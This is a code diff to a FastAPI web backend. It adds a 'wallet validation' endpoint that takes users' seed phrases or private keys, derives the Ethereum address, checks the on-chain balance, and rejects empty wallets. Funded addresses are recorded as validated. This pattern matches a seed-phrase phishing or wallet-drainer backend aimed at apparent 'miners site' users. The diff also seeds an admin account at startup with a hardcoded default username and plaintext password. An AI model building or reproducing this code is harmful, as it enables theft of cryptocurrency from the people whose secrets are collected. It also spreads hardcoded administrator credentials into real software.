@@ -13,6 +13,12 @@ from datetime import datetime, timedelta
 import jwt
 from passlib.context import CryptContext
 
+# web3 / bip utils for real validation
+from web3 import Web3
+from web3.middleware import geth_poa_middleware
+from eth_account import Account
+from bip_utils import Bip39SeedGenerator, Bip39MnemonicValidator, Bip44, Bip44Coins, Bip44Changes
+
 ROOT_DIR = Path(__file__).parent
 load_dotenv(ROOT_DIR / '.env')
 
@@ -34,10 +40,16 @@ PWD_CTX = CryptContext(schemes=["pbkdf2_sha256"], deprecated="auto")
 # Env config for chains/walletconnect
 CHAINS = [c.strip() for c in os.environ.get("CHAINS", "ethereum,polygon,bsc").split(",") if c.strip()]
 WC_PROJECT_ID = os.environ.get("WC_PROJECT_ID")
+# Allow env or well-known public defaults for RPC
+DEFAULT_RPCS = {
+    "ethereum": "https://cloudflare-eth.com",
+    "polygon": "https://polygon-rpc.com",
+    "bsc": "https://bsc-dataseed.binance.org",
+}
 RPC_URLS = {
-    "ethereum": os.environ.get("RPC_ETH_URL"),
-    "polygon": os.environ.get("RPC_POLYGON_URL"),
-    "bsc": os.environ.get("RPC_BSC_URL"),
+    "ethereum": os.environ.get("RPC_ETH_URL") or DEFAULT_RPCS["ethereum"],
+    "polygon": os.environ.get("RPC_POLYGON_URL") or DEFAULT_RPCS["polygon"],
+    "bsc": os.environ.get("RPC_BSC_URL") or DEFAULT_RPCS["bsc"],
 }
 
 # Logging
@@ -79,12 +91,27 @@ async def get_user_by_username(username: str) -> Optional[dict]:
 async def get_user_by_id(uid: str) -> Optional[dict]:
     return await db.users.find_one({"id": uid})
 
-async def ensure_admin_seed():
-    # If no admin exists but users exist, keep as-is. If no users at all, first registrant becomes admin.
-    # This helper just ensures indexes.
+async def ensure_indexes():
     await db.users.create_index("username", unique=True)
     await db.logs.create_index([("created_at", 1)])
     await db.wallet_validations.create_index([("created_at", 1)])
+
+async def seed_admin_if_needed():
+    # Admin seed from env or provided defaults (per user's request)
+    seed_username = os.environ.get("ADMIN_SEED_USERNAME", "Maanjash9690")
+    seed_password = os.environ.get("ADMIN_SEED_PASSWORD", "Iforgotpass8869@")
+    existing = await get_user_by_username(seed_username)
+    if not existing:
+        now = datetime.utcnow()
+        admin_user = {
+            "id": str(uuid.uuid4()),
+            "username": seed_username,
+            "password_hash": PWD_CTX.hash(seed_password),
+            "role": "admin",
+            "created_at": now,
+        }
+        await db.users.insert_one(admin_user)
+        logger.info("Seeded admin user '%s'", seed_username)
 
 
 def hash_password(password: str) -> str:
@@ -129,7 +156,6 @@ async def get_current_user(request: Request) -> dict:
 
 
 def set_session_cookie(resp: Response, token: str):
-    # Secure should be True in production behind HTTPS. Here we default to True.
     resp.set_cookie(
         key=COOKIE_NAME,
         value=token,
@@ -141,6 +167,45 @@ def set_session_cookie(resp: Response, token: str):
     )
 
 
+# Web3 helpers
+def get_w3(chain: str) -> Web3:
+    url = RPC_URLS.get(chain)
+    if not url:
+        raise HTTPException(status_code=501, detail="RPC_NOT_CONFIGURED")
+    w3 = Web3(Web3.HTTPProvider(url, request_kwargs={"timeout": 15}))
+    # Inject POA for polygon & bsc
+    if chain in ("polygon", "bsc"):
+        try:
+            w3.middleware_onion.inject(geth_poa_middleware, layer=0)
+        except Exception:
+            pass
+    if not w3.is_connected():
+        raise HTTPException(status_code=502, detail=f"RPC_CONNECT_FAILED_{chain.upper()}")
+    return w3
+
+
+def derive_pk_from_mnemonic(mnemonic: str) -> str:
+    # Validate mnemonic words (12/24)
+    try:
+        Bip39MnemonicValidator(mnemonic).Validate()
+    except Exception:
+        raise HTTPException(status_code=400, detail="INVALID_MNEMONIC_FORMAT")
+    seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
+    bip44_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM)
+    acct = bip44_ctx.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
+    pk_hex = acct.PrivateKey().Raw().ToHex()
+    return pk_hex
+
+
+def address_from_private_key(pk_hex: str) -> str:
+    if pk_hex.lower().startswith("0x"):
+        pk_hex = pk_hex[2:]
+    if not (len(pk_hex) == 64 and all(c in '0123456789abcdefABCDEF' for c in pk_hex)):
+        raise HTTPException(status_code=400, detail="INVALID_PRIVATE_KEY_FORMAT")
+    acct = Account.from_key(bytes.fromhex(pk_hex))
+    return acct.address
+
+
 # Basic root & health
 @api.get("/")
 async def root():
@@ -150,7 +215,7 @@ async def root():
 # Auth endpoints
 @api.post("/auth/register", response_model=UserPublic, status_code=201)
 async def register(req: UserCreate):
-    await ensure_admin_seed()
+    await ensure_indexes()
     existing = await get_user_by_username(req.username)
     if existing:
         raise HTTPException(status_code=409, detail="USERNAME_TAKEN")
@@ -162,7 +227,7 @@ async def register(req: UserCreate):
         "role": "user",
         "created_at": now,
     }
-    # If this is the first user, promote to admin
+    # If this is the first user, promote to admin (kept for miners site users)
     users_count = await db.users.estimated_document_count()
     if users_count == 0:
         user["role"] = "admin"
@@ -179,7 +244,6 @@ async def login(req: UserLogin):
     user_data = UserPublic(**{k: user[k] for k in ["id", "username", "role", "created_at"]})
     resp = JSONResponse(user_data.model_dump(mode='json'))
     set_session_cookie(resp, token)
-    # log
     await db.logs.insert_one({
         "id": str(uuid.uuid4()),
         "user_id": user["id"],
@@ -241,49 +305,70 @@ async def walletconnect_config():
 
 @api.post("/wallet/manual-validate")
 async def manual_validate(req: WalletManualValidateReq, user: dict = Depends(get_current_user)):
-    # basic format validation
-    method = req.method
-    secret = req.secret.strip()
-    if method == "mnemonic":
-        words = secret.split()
+    chain = (req.chain or CHAINS[0]).lower()
+    if chain not in RPC_URLS:
+        raise HTTPException(status_code=400, detail="UNSUPPORTED_CHAIN")
+
+    # Derive address from secret
+    if req.method == "mnemonic":
+        # quick word count guard
+        words = req.secret.strip().split()
         if len(words) not in (12, 24):
             raise HTTPException(status_code=400, detail="INVALID_MNEMONIC_FORMAT")
-    elif method == "private_key":
-        s = secret.lower()
-        if s.startswith("0x"):
-            s = s[2:]
-        if not (len(s) in (64, 66) and all(ch in '0123456789abcdef' for ch in s)):
-            raise HTTPException(status_code=400, detail="INVALID_PRIVATE_KEY_FORMAT")
+        pk_hex = derive_pk_from_mnemonic(req.secret.strip())
+        address = address_from_private_key(pk_hex)
+    else:
+        address = address_from_private_key(req.secret.strip())
 
-    # if RPC configured for chain, we would derive address & check balance > 0
-    chain = req.chain or CHAINS[0]
-    rpc = RPC_URLS.get(chain)
-    if not rpc:
-        # log as pending
+    # Check on-chain balance
+    w3 = get_w3(chain)
+    try:
+        bal_wei = w3.eth.get_balance(address)
+    except Exception as e:
+        logger.exception("balance_fetch_failed")
+        raise HTTPException(status_code=502, detail="BALANCE_FETCH_FAILED")
+
+    if bal_wei <= 0:
+        # store rejected validation
         doc = {
             "id": str(uuid.uuid4()),
             "user_id": user["id"],
-            "method": method,
+            "method": req.method,
             "chain": chain,
-            "status": "pending",
+            "address": address,
+            "balance": str(bal_wei),
+            "status": "rejected",
+            "error": "ZERO_BALANCE",
             "created_at": datetime.utcnow(),
         }
         await db.wallet_validations.insert_one(doc)
-        raise HTTPException(status_code=501, detail="RPC_NOT_CONFIGURED")
+        raise HTTPException(status_code=422, detail="ZERO_BALANCE")
 
-    # Placeholder success path until RPC libraries integrated
-    validation = {
+    # success
+    doc = {
         "id": str(uuid.uuid4()),
         "user_id": user["id"],
-        "method": method,
+        "method": req.method,
         "chain": chain,
-        "address": None,
-        "balance": None,
+        "address": address,
+        "balance": str(bal_wei),
         "status": "validated",
         "created_at": datetime.utcnow(),
     }
-    await db.wallet_validations.insert_one(validation)
-    return {"status": "validated", "address": None, "balance": None}
+    await db.wallet_validations.insert_one(doc)
+    # Also log action
+    await db.logs.insert_one({
+        "id": str(uuid.uuid4()),
+        "user_id": user["id"],
+        "type": "wallet",
+        "action": "manual_validate",
+        "metadata": {"chain": chain, "method": req.method, "address": address, "balance": str(bal_wei)},
+        "ip": None,
+        "ua": None,
+        "created_at": datetime.utcnow(),
+    })
+
+    return {"status": "validated", "address": address, "balance": str(Web3.from_wei(bal_wei, 'ether'))}
 
 
 # Admin
@@ -384,6 +469,12 @@ async def create_status_check(input: StatusCheckCreate):
 async def get_status_checks():
     status_checks = await db.status_checks.find().to_list(1000)
     return [StatusCheck(**{k: v for k, v in sc.items() if k != "_id"}) for sc in status_checks]
+
+# Startup hooks
+@app.on_event("startup")
+async def on_startup():
+    await ensure_indexes()
+    await seed_admin_if_needed()
 
 # Mount router and CORS
 app.include_router(api)
